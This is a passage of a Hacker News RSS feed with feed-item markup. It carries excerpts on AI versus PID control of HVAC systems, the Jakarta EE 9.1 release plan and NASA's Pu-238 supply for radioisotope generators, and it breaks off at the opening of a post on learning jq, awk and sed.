<em>Heating, Ventilation and Air Conditioning</em> (HVAC) systems, and draws a comparison with <em>intelligent agents</em> (supported
by artificial intelligence techniques) and their benefits. As such, we take as a basis of comparison a common HVAC
system type (<em>Variable Air Volume</em> or VAV) and show where classic control technics fall short while intelligent agents
bring in better performance.</p>

<h2 id="hvac-components-control-optimization-context">HVAC components control optimization: context</h2>

<p>According to <a href="https://www.eia.gov/consumption/commercial/reports/2012/energyusage/">US Energy Information Agency</a>, HVAC
systems were responsible for not less than 40% of energy consumption in commercial buildings in 2012. With such a 
significant footprint, everyone has an interest in optimizing their control and operations.</p>

<p>Below diagram gives a simplified description of such HVAC system, of <em>VAV</em> type, as we find in many buildings in US,
Europe and Asia since 1980 onwards. This type of system, as its name suggests, varies the amount of air to meet heating,
cooling and air renewal demands in building spaces. While its installation cost is higher than previous generation 
(namely, <em>Constant Air Volume</em>), it has replaced it advantageously since it brings better comfort guarantees and less
energy expenses. We encounter this in medium to large size buildings mainly, in every kind of facilities.</p>

<p><img src="https://airboxlab.github.io/assets/pid_vs_ai/ncc_hvac_schematics.svg" alt="sources"></p>
<center><i>fig. 1: simplified schematics of a typical Variable Air Volume (VAV) HVAC system, with central mechanical cooling and hot water reheat</i></center>


<p>As we can observe, a VAV is a centralized system: most of the ventilation, cooling and heating happens in one place, and
this requires to be configured and operated to meet all demands. By intuition, one can already imagine the challenges
that such systems face: a single (or a handful of) equipment of any kind must satisfy potentially dozens of open spaces,
cell offices, meeting rooms, … This requires proper sizing, configuration and control.</p>

<p>To do so, HVAC industry relies on processes, hardware and techniques that, for some of them, are decades-old. Given
investment costs to design and promote new equipment or control techniques, but also to replace those already installed,
there is some inertia, legitimate to some extent. But as we’ll discuss in next sections, optimisation or removal of
existing limitations don’t require many capital expenditure anymore. Modern, software-based approaches can
bring dramatic improvements without a full-fledged retrofit.</p>

<h2 id="shortcomings-of-classic-controllers-in-hvac-systems">Shortcomings of classic controllers in HVAC systems</h2>

<p>To understand what can go wrong, let’s begin our short study by describing classic control systems and strategies in
HVAC systems, backed by concrete examples of sub-optimal control in an actual building.</p>

<h3 id="a-classic-controller-case-study-proportional-integral-derivative">A classic controller case study: Proportional-Integral-Derivative</h3>

<p>Proportional-Integral-Derivative, or <em>PID</em>, are the three calculation terms employed in this type of controller to
obtain a process control loop. For many decades, it’s the go-to in industrial processes, and HVAC systems are no
exception.</p>

<p>However, they have known limitations, that are common to all PID controllers or more specific to HVAC-related processes.
Below we summarize some of them, in order to build a first intuition on what could be optimized.</p>

<h4 id="typical-limitations-of-a-pid">Typical limitations of a PID</h4>

<p>Let’s take an example with an actual PID controller used to vary supply air fan speed in a VAV system. A common control
strategy is to make the most-open VAV box damper position reach 90%. So this PID has the maximum of all dampers position
as input, a fixed set point of 90%, and outputs fan speed.</p>

<p>The first limitation is intrinsically coming from how PID works: it requires a margin in the set point to produce stable
results when the controlled process is mechanical (e.g. fan speed can’t go higher than 100% or lower than 0%). When the 
limit of process range is reached, errors accumulate but the controlled process can’t go further in the same direction. 
This is known as <a href="https://en.wikipedia.org/wiki/Integral_windup">integral windup</a>. When it comes to fan control, a 
typical strategy is then to fix the set point below range limit, usually 90%.</p>

<p>The second limitation is also inherent to PID internals: a large change in set point or in input value will produce
excessive change in the output (mostly due to derivative part of the PID: on a large change, derivative term will be
very large). A common solution is to use ramping either on set point or on PID input (in some “enhanced” controllers).
This produces very slow responses, on a fan start-up that means a long delay before reaching the set point. This can be
observed on below chart, where it takes more than 30min for the PID to reach the set point.</p>

<p><img src="https://airboxlab.github.io/assets/pid_vs_ai/pid_fan_rampup.png" alt="sources"></p>
<center><i>fig. 2: supply fan speed controlled by a PID and most-open VAV damper position (used as PID input) show a slow 
ramp-up of about 30min</i></center>

<p>Note: ramping is still necessary to deal with mechanical constraints, a common rule is to avoid changes larger than 10%
per minute on fan speed.<br></p>

<p>A third limitation comes from <a href="https://en.wikipedia.org/wiki/PID_controller#Loop_tuning">PID gains tuning</a> which is a
tedious and time-consuming process. Even when controllers come with pre-defined and safe tunings for a particular class
of equipment, the HVAC engineer will have to reconfigure them to reach good performance, since each ventilation system
is unique. However, this tuning, performed once for all (HVAC configurations are only partially revised from time to
time), has about zero chance to cover all operating conditions. This results in typical PID problems like <em>overshooting</em>
,
<em>oscillations</em> or <em>hunting</em>. This can be observed in chart below, where the desired set point is still fixed at 90%</p>

<p><img src="https://airboxlab.github.io/assets/pid_vs_ai/pid_fan_oscillations.png" alt="sources"></p>
<center><i>fig. 3: supply fan speed controlled by a PID subject to large oscillations</i></center>


<p>Last but not least, PID controllers are often driven by a single input: in our case, most-open VAV damper position.
However, is this really the goal of a supply fan or did we just find a proxy to accommodate with controller
specifications? The actual real goal is to maintain good thermal and air quality comfort in occupied spaces, while
minimizing energy consumption.</p>

<p>While the proxy target of 90% can satisfy first part, it has no consideration for energy
savings. How does this translate? This is very usual to find one damper open at 90% while others are way below. This isn’t
just a PID problem (or more specifically, just with the PID controlling the fan), but it’s natural to have zones with
less air demand than others, and zones that are almost always in demand (also known as rogue zones). With a PID, one
can’t do anything about that. Figure 4 illustrates this problem, where a large difference occurs between damper
positions.</p>

<p><img src="https://airboxlab.github.io/assets/pid_vs_ai/pid_dampers_position.png" alt="sources"></p>
<center><i>fig. 4: supply fan control strategy leading to large differences between VAV boxes dampers position</i></center>


<h4 id="if-only-i-had-known-that-before">“If only I had known that before…”</h4>

<p>A PID is only reacting: for a given change in input, it will vary its output to keep as close as possible to its set
point. It has no way to anticipate changes or take proactive actions, since it has neither explicit nor inferred knowledge of
the controlled system. Moreover, its single input gives it a very partial view of the process at hand.</p>

<p>With such <em>observer model</em>, anticipation isn’t possible, while simple intuitions could be used to save bits of energy
here and there. A simple example: when HVAC scheduled end of operations is in sight, one could be tempted to slowly
reduce heating or cooling equipment use but not too much to reach end time between desired spaces set points. This is
something a PID can’t do.</p>

<p>If we generalise this example, <strong>the optimal system should learn building thermal dynamics and discover best control
strategies</strong>. There are many, and they depend on building use and characteristics.</p>

<h3 id="design-conditions-versus-reality">Design conditions versus reality</h3>

<p>As stated in <em>Pacific Northwest National Laboratory</em>
report <a href="https://www.pnnl.gov/main/publications/external/technical_reports/pnnl-22072.pdf">Energy Savings for Occupancy-Based Control (OBC) of Variable-Air-Volume (VAV) Systems</a>:</p>

<blockquote>
  <p>Each terminal box has a minimum air-flow rate that ensures the ventilation requirements of the occupants of the zone served are met. This minimum air-flow rate is maintained at a constant value based on the design occupancy of the zone, which often corresponds to the maximum occupancy, because measurements of actual occupancy are not currently used to adjust the flow rate. […] In practice, control system integrators and installers often set the cooling minimum air-flow rate for ventilation to between 30% and 50% of the maximum air-flow rate of the terminal box.</p>
</blockquote>

<p>The process of <em>Testing, Adjusting and Balancing</em> (TAB) of a building HVAC system is meant to deliver sufficient amount
of air, and make sure there will be enough heating and cooling capacity. All the calculation and testing is performed
using building <em>design conditions</em>. In practice, it is undertaken when building is still unoccupied, during one or a
handful of days (so during a particular season, with specific weather conditions). It doesn’t cover the actual use of
the building, which will vary over the course of its life: daily changes - with spaces more or less occupied depending
on the hour of the day - and more profound and permanent changes, like when exceptional conditions arise (Covid-19 and 
its cascade of lockdowns), or simply because tenants’ activity changes.</p>

<p>Another source of HVAC system misconfiguration and excessive energy use is the small and repetitive adjustments made 
over time by people who are responsible for occupants comfort, or to deal with system instability (operational conditions not
tested during initial setup). While it seems natural they make everything they can to guarantee satisfactory living
conditions, this often results in more energy wasted due to narrowed operational behaviour (e.g. raising minimum set
points).</p>

<h3 id="non-linearity-in-controlled-systems">Non-linearity in controlled systems</h3>

<p>HVAC systems are (highly) non-linear: they will respond non-linearly depending on controlled equipment, command
magnitude, and current state of the system (for instance: cooling or heating mode).</p>

<p>A classic example can be …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://airboxlab.github.io/hvac/control/ai/reinforcement_learning/2021/01/24/smart_control.html">https://airboxlab.github.io/hvac/control/ai/reinforcement_learning/2021/01/24/smart_control.html</a></em></p>]]>
            </description>
            <link>https://airboxlab.github.io/hvac/control/ai/reinforcement_learning/2021/01/24/smart_control.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370901</guid>
            <pubDate>Sat, 06 Mar 2021 21:57:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jakarta EE 9.1 Release Plan]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26370623">thread link</a>) | @based2
<br/>
March 6, 2021 | https://eclipse-ee4j.github.io/jakartaee-platform/jakartaee9/JakartaEE9.1ReleasePlan | <a href="https://web.archive.org/web/*/https://eclipse-ee4j.github.io/jakartaee-platform/jakartaee9/JakartaEE9.1ReleasePlan">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            

<h2 id="scope">Scope</h2>

<p>The goal of the Jakarta EE 9.1 release is to deliver a set of specifications functionally equivalent to Jakarta EE 9 and adding the support for the Java SE 11 runtime.</p>

<p>The Platform team sees Jakarta EE 9.1 as an extension to the foundational Jakarta EE 9 release.
No API updates are expected in Jakarta EE 9.1.
Only the Platform and Web Profile Specifications along with the TCK and Compatible Implementations should be affected by Jakarta EE 9.1.</p>

<h2 id="java-se-11">Java SE 11</h2>
<h3 id="api-source-level">API Source Level</h3>

<p>The APIs will continue to be compiled at the Java SE 8 level.
The APIs need to be usable by both Java SE 8 and Java SE 11.
Thus, keeping the same Java SE 8 source/target level for the APIs will still be required.</p>

<h3 id="tck-source-level">TCK Source Level</h3>

<p>The TCKs will continue to be compiled at the Java SE 8 level.
This would allow the same TCK to be used for Compatibility testing with either Java SE 8 or 11 runtime.</p>

<h4 id="signature-tests">Signature Tests</h4>

<p>Currently, the TCK Signature Tests are specific to the level of the Java SE runtime which is being used for testing.
The TCK may need to be updated to include the Java SE 11 signatures.</p>

<h4 id="corba-and-rmiiiop-tests">CORBA and RMI/IIOP Tests</h4>

<p>For Jakarta EE 9, the CORBA tests were left as-is and these tests were executed by default, but the RMI/IIOP tests were removed as part of the default execution.
Since the CORBA ORB was removed from Java SE 11, there will be an impact to the TCK to support these CORBA tests.
To minimize the impact to Jakarta EE 9.1, the expectation is to leave the CORBA tests in the TCK, but make them optional.</p>

<h4 id="web-services-tests">Web Services Tests</h4>

<p>Many of the Web Services related features (XML Binding, XML Web Services, Web Services Metadata, and SOAP with Attachments) were dropped from Java SE 11.
But, they were picked up for optional inclusion with Jakarta EE 9.
Since these optional features were provided with the Java SE 8 runtime, the TCK may need to be adjusted when running with the Java SE 11 runtime where they are no longer provided.</p>

<h3 id="compatible-implementation-ci-source-level">Compatible Implementation (CI) Source Level</h3>

<p>How a Compatible Implementation supports the Java SE 11 runtime will be left as a vendor-defined solution.</p>

<h2 id="specification-project-minor-point-releases">Specification Project Minor (Point) Releases?</h2>

<p>A few of the Jakarta Specification projects are already working on their “next” releases.
This type of new, innovative work needs to be encouraged and promoted.</p>

<p>Since the ultimate goal of Jakarta EE 9.1 is to support the Java SE 11 runtime in a timely manner, no Specification API updates will be included in 9.1.
If the Specification text or Javadoc needs to be updated to clarify some processing without any functional impact to the API, those types of changes should be entertained via a Service Release (x.y.z).
The exact process for Specification Service Releases (extent of changes, reviews required, ballots required, etc) is still being worked out.</p>

<p>The preferred approach would be for these Specification projects to continue with their proposed “next” releases – taking them through the required plan and review processes.
But, don’t attempt to tie them to the Jakarta EE 9.1 release.
These would just be independent updates to the Jakarta Specifications that could be discussed for inclusion in a future Jakarta EE Platform release.</p>

<h2 id="deliverables-in-jakarta-ee-91">Deliverables in Jakarta EE 9.1</h2>

<p>The following details the specifications and APIs included within the Jakarta EE 9.1 Platform.</p>

<h3 id="jakarta-ee-91-specifications">Jakarta EE 9.1 Specifications</h3>

<p>List of existing specifications in Jakarta EE 9.1.
(<strong>Note:</strong> Service Releases (x.y.z) are not specified here since no functional changes are included in a Service Release.)</p>

<ul>
  <li>Jakarta EE Platform 9.1</li>
  <li>Jakarta EE Web Profile 9.1</li>
  <li>Jakarta Activation 2.0</li>
  <li>Jakarta Annotations 2.0</li>
  <li>Jakarta Authentication 2.0</li>
  <li>Jakarta Authorization 2.0</li>
  <li>Jakarta Batch 2.0</li>
  <li>Jakarta Bean Validation 3.0</li>
  <li>Jakarta Concurrency 2.0</li>
  <li>Jakarta Connectors 2.0</li>
  <li>Jakarta Contexts and Dependency Injection 3.0</li>
  <li>Jakarta Debugging Support for Other Languages 2.0</li>
  <li>Jakarta Dependency Injection 2.0</li>
  <li>Jakarta Enterprise Beans 4.0</li>
  <li>Jakarta Enterprise Web Services 2.0 (Optional)</li>
  <li>Jakarta Expression Language 4.0</li>
  <li>Jakarta Interceptors 2.0</li>
  <li>Jakarta JSON Binding 2.0</li>
  <li>Jakarta JSON Processing 2.0</li>
  <li>Jakarta Mail 2.0</li>
  <li>Jakarta Managed Beans 2.0</li>
  <li>Jakarta Messaging 3.0</li>
  <li>Jakarta Persistence 3.0</li>
  <li>Jakarta RESTful Web Services 3.0</li>
  <li>Jakarta Security 2.0</li>
  <li>Jakarta Server Faces 3.0</li>
  <li>Jakarta Server Pages 3.0</li>
  <li>Jakarta Servlet 5.0</li>
  <li>Jakarta SOAP with Attachments 2.0 (Optional)</li>
  <li>Jakarta Standard Tag Library 2.0</li>
  <li>Jakarta Transactions 2.0</li>
  <li>Jakarta WebSocket 2.0</li>
  <li>Jakarta Web Services Metadata 3.0 (Optional)</li>
  <li>Jakarta XML Binding 3.0 (Optional)</li>
  <li>Jakarta XML Web Services 3.0 (Optional)</li>
</ul>

<h3 id="jakarta-ee-91-apis">Jakarta EE 9.1 APIs</h3>

<p>The Platform and Web Profile API jar files will be re-generated to correspond with the 9.1 release designation.
The intent is that the content of the 9.0 and 9.1 jar files are the same, but update the maven coordinate artifacts to make them easy to find and use.</p>

<h2 id="release-milestones">Release Milestones</h2>

<p>The Jakarta EE 9.1 platform project is proposing that this release plan covers all specifications targeted for Jakarta EE 9.1.
As stated in the scope, specifications will not be making functionality changes for inclusion in this release, therefore individual specification release plans are not necessary.</p>

<h3 id="full-platform-and-web-profile-release-candidate">Full Platform and Web Profile Release Candidate</h3>

<p>Although the Jakarta EE 9.1 release is limited in scope, at least one Release Candidate for Jakarta EE Platform and Web Profile will be produced.
These Release Candidates will include:</p>

<ul>
  <li>Release candidates for all API JARs in Maven Central</li>
  <li>Release candidate Bill of Material pom files for Web Profile and Full Platform in Maven Central</li>
  <li>Release candidate TCKs</li>
  <li>Release candidate compatible implementation(s)</li>
</ul>

<p>Once the release candidate has been validated and any issues ironed out, the full 9.1 release will proceed with all deliverables required for submission to the specification committee for approval.</p>

<h3 id="proposed-progress-reviews">Proposed Progress Reviews</h3>

<p>Since this Jakarta EE 9.1 release is limited in scope, no interim progress reviews are expected.
The overall schedule for Jakarta EE 9.1 will be maintained on <a href="https://eclipse-ee4j.github.io/jakartaee-platform/jakartaee9/JakartaEE9.1#jakarta-ee-9.1-schedule">this separate page</a>.</p>

<h3 id="compatible-implementation">Compatible Implementation</h3>

<p>The JESP requires us to have a Compatible Implementation of the Full Profile and Web Profile available before the Platform Project can deliver a final specification.
At this stage, it is assumed that this implementation will be Eclipse GlassFish.
However, the Platform project has no control over the release dates of Eclipse GlassFish.
The platform project will maintain close coordination with the Eclipse GlassFish project for the duration of the Jakarta EE 9.1 release development.</p>

<h2 id="faq">FAQ</h2>

<p>Additional clarifications for this Release Plan can be found in the <a href="https://eclipse-ee4j.github.io/jakartaee-platform/jakartaee9/JakartaEE9.1ReleasePlanFAQ">Jakarta EE 9.1 Release Plan FAQ</a>.</p>
 
          </div></div>]]>
            </description>
            <link>https://eclipse-ee4j.github.io/jakartaee-platform/jakartaee9/JakartaEE9.1ReleasePlan</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370623</guid>
            <pubDate>Sat, 06 Mar 2021 21:22:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Radioisotope Thermoelectric Generators for Spacecraft: Plutonium 238 Production]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26370522">thread link</a>) | @philipkglass
<br/>
March 6, 2021 | https://lynceans.org/all-posts/radioisotope-thermoelectric-generators-rtg-for-spacecraft-history-and-current-u-s-pu-238-production-status/ | <a href="https://web.archive.org/web/*/https://lynceans.org/all-posts/radioisotope-thermoelectric-generators-rtg-for-spacecraft-history-and-current-u-s-pu-238-production-status/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><strong>Updated 5 March 2021</strong></p>
<p>Peter Lobner</p>
<p>Radioisotope Thermoelectric Generators (RTG), also called Radioisotope Power Systems (RTS), commonly use non-weapons grade Plutonium 238 (Pu-238) to generate electric power and heat for National Aeronautics and Space Administration (NASA) spacecraft when solar energy and batteries are not adequate for the intended mission. In comparison to other RTG heat sources (Strontium-90, Cesium-137), Pu-238 has a relatively long half-life of 87.75 years, which is a desirable property for a long-life RTG.</p>
<p>Approximately 300 kg (661 lb) of Pu-238 was produced by the Department of Energy (DOE) at the Savannah River Site between 1959 – 1988. After U.S production stopped, the U.S. purchased Pu-238 from Russia until that source of supply ended in 2010.</p>
<p>Limited production of new Pu-238 in the U.S re-started in 2013 using the process shown below. This effort is&nbsp;partially funded by NASA. &nbsp;Eventually, production capacity will be about&nbsp;1.5 kg (3.3 lb) Pu-238 per year. The roles of the DOE national laboratories involved in this production process are as follows:</p>
<ul>
<li>Idaho National Engineering Lab (INEL):
<ul>
<li>Store the Neptunium dioxide (NpO<sub>2</sub>) feed stock</li>
<li>Deliver feed stock as needed to ORNL</li>
<li>Irradiate targets provided by ORNL in the Advanced Test Reactor (ATR)</li>
<li>Return irradiated targets to ORNL for processing</li>
</ul>
</li>
<li>Oak Ridge National Lab (ORNL):
<ul>
<li>Manufacture targets</li>
<li>Ship some targets to INEL for irradiation</li>
<li>Irradiate the remaining targets in the High Flux Isotope Reactor (HFIR)</li>
<li>Process all irradiated targets to recover and purify Pu-238</li>
<li>Convert Pu-238 to oxide and deliver as needed to LANL</li>
</ul>
</li>
<li>Los Alamos National Lab (LANL):
<ul>
<li>Manufacture the Pu-238 fuel pellets for use in RTGs</li>
</ul>
</li>
</ul>
<p><a href="https://lynceans.org/wp-content/uploads/2015/04/Pu-238-production-process.jpg"><img loading="lazy" src="https://lynceans.org/wp-content/uploads/2015/04/Pu-238-production-process-300x69.jpg" alt="Pu-238 production process" width="578" height="133" srcset="https://lynceans.org/wp-content/uploads/2015/04/Pu-238-production-process-300x69.jpg 300w, https://lynceans.org/wp-content/uploads/2015/04/Pu-238-production-process.jpg 960w" sizes="(max-width: 578px) 100vw, 578px"></a></p>
<p><em>Source: Ralph L McNutt, Jr, Johns Hopkins University APL, 2014</em></p>
<p>In 2015, the U.S. had an existing inventory&nbsp;of&nbsp;about 35 kg (77 lb) of Pu-238 of various ages. &nbsp;About half was young enough to meet the power specifications of planned NASA spacecraft. The remaining stock was more than 20 years old, has decayed significantly since it was produced, and did not meet specifications. &nbsp;The existing inventory&nbsp;will be blended with newly produced Pu-238 to extend the usable inventory. To get the energy density needed for space missions while extending the supply of Pu-238, DOE and NASA plan to blend “old” Pu-238 with newly produced Pu-238 in 2:1 proportions.</p>
<p>Since 2010, NASA’s RTG for spacecraft missions has been the Multi-Mission Radioisotope Thermoelectric Generator (MMRTG), which It is based on the SNAP-19 RTG flown on the two Viking Mars landers (circa 1975) and the Pioneer 10 and 11 deep space probes (circa 1972). At beginning of life, the current MMRTG can provide about 2,000 watts of thermal power and 110 watts of electrical power from eight General Purpose Heat Source (GPHS) modules that contain a total of 10.6 pounds (4.8 kilograms) of plutonium dioxide fuel. Electric conversion efficiency is about 6%.</p>
<p><img loading="lazy" src="https://lynceans.org/wp-content/uploads/2021/03/Mars-2020_MMRTG-300x240.jpg" alt="" width="444" height="355" srcset="https://lynceans.org/wp-content/uploads/2021/03/Mars-2020_MMRTG-300x240.jpg 300w, https://lynceans.org/wp-content/uploads/2021/03/Mars-2020_MMRTG-768x614.jpg 768w, https://lynceans.org/wp-content/uploads/2021/03/Mars-2020_MMRTG.jpg 826w" sizes="(max-width: 444px) 100vw, 444px"></p>
<p><em>Assembled MMRTG on a transport dolly.&nbsp; Source: NASA</em></p>
<p><img loading="lazy" src="https://lynceans.org/wp-content/uploads/2021/03/MMRTG-cut-away-300x252.jpg" alt="" width="441" height="371" srcset="https://lynceans.org/wp-content/uploads/2021/03/MMRTG-cut-away-300x252.jpg 300w, https://lynceans.org/wp-content/uploads/2021/03/MMRTG-cut-away.jpg 512w" sizes="(max-width: 441px) 100vw, 441px"></p>
<p><em>MMRTG cut-away diagram.&nbsp; Source: NASA</em></p>
<p>You’ll find a NASA MMRTG Fact Sheet here:&nbsp; <a href="https://rps.nasa.gov/resources/86/multi-mission-radioisotope-thermoelectric-generator-mmrtg/?category=fact_sheets">https://rps.nasa.gov/resources/86/multi-mission-radioisotope-thermoelectric-generator-mmrtg/?category=fact_sheets</a></p>
<p>NASA had a program to develop an Advanced Stirling Radioisotope Generator (ASRG), which was designed to produce about four times the power of the MMRTG per unit of Pu-238. Electric conversion efficiency was about 26%. The ASRG required a total of 2.7 pounds (1.2 kilograms) of plutonium dioxide in two GPHS modules. However, the ASRG would produce less waste heat, which can be used productively to warm electronics in the interior of a spacecraft, such as the Mars rover Curiosity.&nbsp; In November 2013, NASA announced that ASRG development had been discontinued because of budget cuts. You’ll find a NASA ASRG Fact Sheet at the following link:&nbsp; <a href="https://rps.nasa.gov/resources/65/advanced-stirling-radioisotope-generator-asrg/">https://rps.nasa.gov/resources/65/advanced-stirling-radioisotope-generator-asrg/</a></p>
<p>You can read a history of RTGs and more information on current U.S. Pu-238 production status in a 2014 presentation by Ralph L McNutt, Jr, at the following link: <a href="https://www.lpi.usra.edu/sbag/meetings/jan2014/presentations/08_1545_McNutt_Pu238_SBAG.pdf">https://www.lpi.usra.edu/sbag/meetings/jan2014/presentations/08_1545_McNutt_Pu238_SBAG.pdf</a></p>
<p><strong><span>9 February 2016 Update:</span></strong></p>
<p>On 22 December 2015, DOE reported the first U.S. production in nearly 30 years of Pu-238.&nbsp; &nbsp;This production demonstration, which was partially funded by the NASA, was performed at ORNL and yielded 50 grams of Pu-238.&nbsp; The last U.S. production of Pu-238 occurred in the late 1980s at the Savannah River Plant in South Carolina.</p>
<p>DOE reported that it plans to set an initial production target of 300 – 400 grams (about 12 ounces) of Pu-238 per year. After implementing greater automation and scaling up the process, ORNL expects to reach the the production target of&nbsp;1.5 kg (3.3 lb) Pu-238 per year.</p>
<p>The next NASA mission that will use an RTG is the Mars 2020 rover, which will use an MMRTG, &nbsp;as used on NASA’s Mars rover Curiosity.&nbsp;</p>
<p>You can read the ORNL announcement of initial Pu-238 production at the following link: <a href="https://www.ornl.gov/news/ornl-achieves-milestone-plutonium-238-sample">https://www.ornl.gov/news/ornl-achieves-milestone-plutonium-238-sample</a></p>
<p><strong><u>3 January 2019 Update:</u></strong></p>
<p>In the past three years, ORNL has made scant progress in producing Pu-238.&nbsp; In a 13 December 2018 article, <em>“NASA Doesn’t Have Enough Nuclear Fuel For Its Deep Space Missions,”</em>author Ethan Siegel reports:&nbsp; “Although current production (at ORNL) yields only a few hundred grams per year (less than a pound), the laboratory has the eventual goal of ramping up to 1.5 kilograms (3.3 pounds) per year by 2023, at the earliest.&nbsp; Ontario Power Generation in Canada has also begun producing Pu-238, with the goal of using it as a supplemental source for NASA.” &nbsp;You can read the complete article on the Forbes website at the following link: <a href="https://www.forbes.com/sites/startswithabang/2018/12/13/nasa-doesnt-have-enough-nuclear-fuel-for-its-deep-space-missions/%231a73d47e1c18">https://www.forbes.com/sites/startswithabang/2018/12/13/nasa-doesnt-have-enough-nuclear-fuel-for-its-deep-space-missions/#1a73d47e1c18</a></p>
<p>The Canadian plans for becoming a source of Pu-238 was announced on 1 March 2017:&nbsp; “Ontario Power Generation (OPG) and its venture arm, Canadian Nuclear Partners, are participating in a project to produce isotopes in support of deep space exploration. Under the agreement, OPG would help create isotopes at the Darlington nuclear station east of Toronto that will help power space probes.” You can read the complete OPG press release here: <a href="https://www.opg.com/news-and-media/news-releases/Documents/20170301_DeepSpace.pdf">https://www.opg.com/news-and-media/news-releases/Documents/20170301_DeepSpace.pdf</a></p>
<p>Also see the OPG public relations piece, “<em>OPG looks to the stars</em>,”&nbsp; here: <a href="https://www.opg.com/news-and-media/our-stories/Documents/20170802_OPG_Deep_Space.pdf">https://www.opg.com/news-and-media/our-stories/Documents/20170802_OPG_Deep_Space.pdf</a></p>


<p><strong><u>4 August 2020 Update:</u></strong></p>



<p>The NASA Mars rover, Perseverance, was launched from Cape Canaveral on 30 July 2020, with an expected landing date of 18 February 2021 in the Jezero crater on Mars. Once on the surface, Perseverance will be powered by an MMRTG.</p>



<p>The Pu-238 and some other special materials for the Perseverence MMRTG were produced in the U.S. at ORNL, as described in the following short (2:03 minutes) video, “ORNL-produced tech fuels NASA’s Perseverance mission to Mars”:</p>



<figure><p>
<iframe title="ORNL-produced tech fuels NASA's Perseverance mission to Mars" width="604" height="340" src="https://www.youtube.com/embed/mV1sYjE-zMU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>In a 20 July 2020 news release, ORNL provided more information on the U.S. production process for Pu-238 and reported that, “the lab has been consistently increasing its Pu-238 production capabilities, aiming to produce 1.5 kilograms per year by 2026.”&nbsp;&nbsp;You can read this ORNL press release here: <a href="https://www.ornl.gov/news/ornl-produced-plutonium-238-help-power-perseverance-mars">https://www.ornl.gov/news/ornl-produced-plutonium-238-help-power-perseverance-mars</a></p>



<p>At the planned U.S. production rate for Pu-238, NASA should be able to conduct an MMRTG mission at about four-year intervals.  If NASA MMRTG missions will be more frequent than this, the U.S. will need to purchase additional Pu-238 from another source, perhaps Canada.</p>



<p><strong><u>5 March 2021 Update:</u></strong></p>



<p>The Perseverance rover landed on Mars on 18 February<strong>&nbsp;</strong>2021, in the planned target area in Jezero Crater.&nbsp;&nbsp;Power from the MMRTG was nominal after landing.&nbsp;&nbsp;Perseverance will spend at least one Mars year (two Earth years) exploring the landing site region.</p>



<p>The next NASA mission with an MMRTG-powered spacecraft is the Dragonfly mission to Saturn’s moon Titan, which will launch in 2026 and arrive on Titan in 2034.</p>



<p>The Voyager 1 and 2 spacecraft were launched in 1977, each with three RTGs delivering a maximum of 470 watts of electrical power at the beginning of the mission.&nbsp;&nbsp;Both spacecraft have left the solar system (Voyager 1 in 2013 and Voyager 2 in 2018) and continue to transmit from interstellar space in 2021 with their RTGs operating at a reduced power level of about 331 watts after 44 years of Pu-238 decay during the mission.&nbsp;&nbsp;NASA plans to continue the Voyager missions until at least 2025.</p>



<p><strong>For more information:</strong></p>



<ul><li>“Plutonium-238 Production for Space Exploration – A National Historic Chemical Landmark,” American Chemical Society:&nbsp;<a href="https://www.acs.org/content/acs/en/education/whatischemistry/landmarks/plutonium-238-production.html">https://www.acs.org/content/acs/en/education/whatischemistry/landmarks/plutonium-238-production.html</a></li><li>Plutonium (Pu) 238 Radioactive Isotope Decay Calculator:&nbsp;<a href="https://www.easycalculation.com/chemistry/Pu-238.html">https://www.easycalculation.com/chemistry/Pu-238.html</a></li></ul>
	</div></div>]]>
            </description>
            <link>https://lynceans.org/all-posts/radioisotope-thermoelectric-generators-rtg-for-spacecraft-history-and-current-u-s-pu-238-production-status/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370522</guid>
            <pubDate>Sat, 06 Mar 2021 21:06:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating a MVP landing page using nothing but Notion and a little CSS]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26370452">thread link</a>) | @codingninjas
<br/>
March 6, 2021 | https://noahbragg.com/blog/how-i-created-my-landing-page | <a href="https://web.archive.org/web/*/https://noahbragg.com/blog/how-i-created-my-landing-page">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://noahbragg.com/blog/how-i-created-my-landing-page</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370452</guid>
            <pubDate>Sat, 06 Mar 2021 20:55:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn a little jq, Awk and sed (2019)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26370286">thread link</a>) | @mooreds
<br/>
March 6, 2021 | https://letterstoanewdeveloper.com/2019/07/29/learn-a-little-jq-awk-and-sed/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/2019/07/29/learn-a-little-jq-awk-and-sed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Dear new developer,</p>
<p>You are probably going to be dealing with text files sometime during your development career. These could be plain text, csv, or json. They may have data you want to get out, or log files you want to examine. You may be transforming from one format to another.</p>
<p>Now, if this is a regular occurrence, you may want to build a script or a program around this problem (or use a third party service which aggregates everything together). But sometimes these files are one offs. Or you use them once in a blue moon. And it can take a little while to write a script, look at the libraries, and put it all together.</p>
<p>Another alternative is to learn some of the unix tools available on <a href="https://letterstoanewdeveloper.com/2019/02/04/learn-the-command-line/">the command line</a>. Here are three that I consider “table stakes”.</p>
<p><strong>awk</strong></p>
<p>This is a multi purpose line processing utility. I often want to grab lines of a log file and figure out what is going on. Here’s a few lines of a log file:</p>
